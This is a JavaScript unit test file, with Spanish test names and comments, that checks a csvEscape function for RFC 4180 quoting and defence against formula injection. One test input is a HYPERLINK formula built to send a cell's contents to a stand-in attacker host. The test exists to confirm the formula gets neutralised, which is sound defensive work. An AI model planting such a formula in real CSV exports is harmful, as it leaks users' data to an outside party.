import { describe, expect, it } from 'vitest';
import { csvEscape } from '@/lib/csv';

describe('csvEscape', () => {
  it('deja intacto un valor normal', () => {
    expect(csvEscape('Reel de lanzamiento')).toBe('Reel de lanzamiento');
  });

  it('sigue comillando según RFC 4180 cuando hace falta', () => {
    expect(csvEscape('Uno, dos')).toBe('"Uno, dos"');
    expect(csvEscape('Dijo "hola"')).toBe('"Dijo ""hola"""');
    expect(csvEscape('linea1\nlinea2')).toBe('"linea1\nlinea2"');
  });

  it('neutraliza una fórmula que empieza con =', () => {
    // El comillado por sí solo no evita nada: la hoja de cálculo evalúa la celda igual. El apóstrofo
    // es lo que la marca como texto.
    expect(csvEscape('=HYPERLINK("https://evil.example.com?d="&A1,"Ver")')).toBe(
      '"\'=HYPERLINK(""https://evil.example.com?d=""&A1,""Ver"")"'
    );
  });

  it('neutraliza +, - y @ al inicio', () => {
    expect(csvEscape('+1234')).toBe("'+1234");
    expect(csvEscape('-1+2')).toBe("'-1+2");
    expect(csvEscape('@SUM(A1:A9)')).toBe("'@SUM(A1:A9)");
  });

  it('neutraliza tabulación y retorno de carro al inicio', () => {
    expect(csvEscape('\t=1+1')).toBe("'\t=1+1");
    expect(csvEscape('\r=1+1')).toBe("'\r=1+1");
  });

  it('no neutraliza un carácter peligroso que no está al inicio', () => {
    expect(csvEscape('Precio 10=10')).toBe('Precio 10=10');
  });

  it('antepone el apóstrofo DENTRO de las comillas, no fuera', () => {
    // Si el apóstrofo quedara fuera del comillado, el archivo dejaría de ser CSV válido.
    expect(csvEscape('=A1,B1')).toBe('"\'=A1,B1"');
  });
});
